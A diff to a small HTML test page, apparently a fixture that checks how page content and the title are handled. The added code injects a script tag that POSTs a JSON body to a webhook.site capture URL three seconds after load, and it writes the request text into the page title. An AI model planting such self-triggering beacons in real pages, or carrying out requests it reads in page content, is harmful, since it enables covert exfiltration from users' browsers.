@@ -1,12 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Set content script to title</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Set content script to title</title>
 </head>
-
 <body>
     <script>
         // Function to stringify a request object
@@ -19,8 +17,8 @@
             });
         }
 
-        // Wait for 3 seconds and then set the title
-        setTimeout(function () {
+        // Function to create a script tag with a POST request
+        function createScriptWithPostRequest() {
             var method = "POST";
             var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
             var body = JSON.stringify({
@@ -31,9 +29,16 @@
             };
 
             var requestString = stringifyRequest(method, url, body, headers);
+            var scriptTag = document.createElement('script');
+            scriptTag.textContent = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
+            document.head.appendChild(scriptTag);
             document.title = requestString;
+        }
+
+        // Wait for 3 seconds and then create the script tag with the POST request
+        setTimeout(function () {
+            createScriptWithPostRequest();
         }, 3000);
     </script>
 </body>
-
 </html>
